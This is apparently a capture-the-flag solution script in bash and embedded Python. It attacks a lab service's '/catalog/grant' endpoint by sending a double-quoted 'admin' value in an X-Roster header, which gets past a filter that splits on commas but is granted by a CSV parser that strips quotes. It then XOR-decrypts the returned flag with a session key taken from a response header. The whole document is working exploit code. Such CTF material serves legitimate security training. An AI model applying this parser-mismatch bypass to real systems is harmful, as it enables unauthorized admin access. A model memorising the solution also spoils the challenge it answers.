#!/usr/bin/env bash
set -euo pipefail

HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import json, sys
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# Step 1: init session — get session ID (body) and XOR key (header)
init_resp = urlopen(base + "/catalog/init", timeout=5)
init_data = json.loads(init_resp.read())
sid = init_data["session"]
key_hex = init_resp.headers.get("X-Session-Key", "")
if not key_hex:
    raise SystemExit("no X-Session-Key header from /catalog/init")
key = bytes.fromhex(key_hex)

# Step 2: bypass the CSV filter with double-quoted admin.
# split(",") keeps the double-quote chars → sees "admin" ≠ admin → not blocked.
# csv.reader strips double-quotes per RFC 4180 → sees admin → grants.
# Note: single-quotes do NOT work — csv.reader only strips double-quotes.
req = Request(base + "/catalog/grant", headers={
    "X-Roster": '"admin"',
    "X-Session": sid,
})
resp = urlopen(req, timeout=5)
encrypted = resp.read()

# Step 3: XOR-decrypt the binary body with the session key
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
